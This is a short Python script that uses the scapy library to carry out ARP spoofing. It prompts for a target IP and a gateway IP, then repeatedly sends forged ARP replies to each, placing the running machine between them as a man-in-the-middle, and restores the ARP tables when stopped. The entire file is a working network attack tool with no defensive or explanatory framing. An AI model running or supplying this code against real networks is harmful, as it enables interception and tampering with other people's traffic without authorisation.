import scapy.all as scapy
# import argparse
import time
import sys

#def get_arguments():
    #parser = argparse.ArgumentParser()
    #parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    #parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    #return parser.parse_args()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target_ip = input(" [!] Enter The Target IP : ")
gateway_ip = input(" [!] Enter The Gateway IP : ")

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        sys.stdout.flush()
        time.sleep(2) # Waits for two seconds
  
except KeyboardInterrupt:
    print("\n [-] Ctrl + C detected.............Restoring ARP Tables Please Wait ! ")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
